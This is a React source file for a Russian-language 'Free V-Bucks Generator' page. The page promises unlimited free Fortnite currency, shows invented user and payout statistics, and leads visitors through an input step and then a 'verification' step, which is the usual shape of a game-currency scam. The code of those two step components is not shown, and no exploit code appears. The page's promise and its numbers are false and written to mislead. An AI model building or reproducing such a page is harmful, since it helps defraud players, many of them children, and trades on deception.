import { useState } from "react";
import VBucksInput from "@/components/VBucksInput";
import FortVerificationStep from "@/components/FortVerificationStep";

const FortnitePage = () => {
  const [step, setStep] = useState(1);

  const handleComplete = () => {
    setStep(2);
  };

  return (
    <div className="min-h-screen flex flex-col items-center justify-center relative overflow-hidden">
      {/* Фоновое изображение и эффекты */}
      <div className="absolute inset-0 z-0">
        <div className="absolute inset-0 bg-[url('/placeholder.svg')] bg-cover bg-center"></div>
        <div className="absolute inset-0 bg-gradient-to-t from-black/80 via-blue-900/50 to-purple-900/50"></div>
        
        {/* Анимированные частицы */}
        <div className="absolute inset-0 overflow-hidden">
          <div className="animate-float absolute top-1/4 left-1/4 w-32 h-32 rounded-full bg-[#19e6e6]/10 blur-xl"></div>
          <div className="animate-float-delayed absolute bottom-1/3 right-1/3 w-48 h-48 rounded-full bg-[#9945FF]/10 blur-xl"></div>
          <div className="animate-float-slow absolute top-1/2 right-1/4 w-40 h-40 rounded-full bg-[#FFD700]/10 blur-xl"></div>
        </div>
      </div>
      
      {/* Анимированные элементы Fortnite */}
      <div className="absolute top-20 left-20 w-16 h-16 bg-blue-500/20 rotate-12 rounded-lg opacity-30 animate-float"></div>
      <div className="absolute bottom-40 right-20 w-24 h-24 bg-purple-500/20 -rotate-12 rounded-lg opacity-30 animate-float" style={{ animationDelay: '1s' }}></div>
      <div className="absolute top-1/2 left-10 w-12 h-12 bg-cyan-500/20 rotate-45 rounded-lg opacity-30 animate-float" style={{ animationDelay: '2s' }}></div>
      <div className="absolute bottom-20 left-1/3 w-20 h-20 bg-yellow-500/20 rotate-6 rounded-lg opacity-20 animate-float" style={{ animationDelay: '3s' }}></div>
      
      {/* Главный контент */}
      <header className="relative z-10 mb-8 text-center">
        <div className="flex flex-col items-center">
          <div className="bg-gradient-to-r from-[#19e6e6] to-[#9945FF] text-white text-xs px-3 py-1 rounded-full mb-2 animate-pulse">
            БЕСПЛАТНО
          </div>
          <h1 className="text-4xl md:text-6xl font-extrabold tracking-tight text-white mb-4">
            Бесплатные <span className="bg-clip-text text-transparent bg-gradient-to-r from-[#19e6e6] to-[#9945FF]">В-Баксы</span>
          </h1>
        </div>
        <p className="text-xl text-white/90 max-w-md mx-auto px-4">
          Получите неограниченные В-Баксы для своего аккаунта Fortnite прямо сейчас!
        </p>
      </header>
      
      <main className="relative z-10 w-full max-w-md px-4">
        {step === 1 && <VBucksInput onComplete={handleComplete} />}
        {step === 2 && <FortVerificationStep />}
      </main>
      
      {/* Статистика пользователей */}
      <div className="relative z-10 mt-10 flex justify-center gap-6 text-white/80">
        <div className="text-center">
          <div className="text-xl font-bold text-[#19e6e6]">13,549+</div>
          <div className="text-xs">Пользователей</div>
        </div>
        <div className="h-10 w-px bg-white/20"></div>
        <div className="text-center">
          <div className="text-xl font-bold text-[#9945FF]">8.9M+</div>
          <div className="text-xs">В-Баксов выдано</div>
        </div>
        <div className="h-10 w-px bg-white/20"></div>
        <div className="text-center">
          <div className="text-xl font-bold text-[#FFD700]">97%</div>
          <div className="text-xs">Довольных игроков</div>
        </div>
      </div>
      
      <footer className="relative z-10 mt-12 text-center text-white/70 text-sm px-4 pb-6">
        <p>Сервис распространения В-Баксов не связан с Epic Games.</p>
        <p className="mt-1">© 2023 Free V-Bucks Generator</p>
      </footer>
    </div>
  );
};

export default FortnitePage;
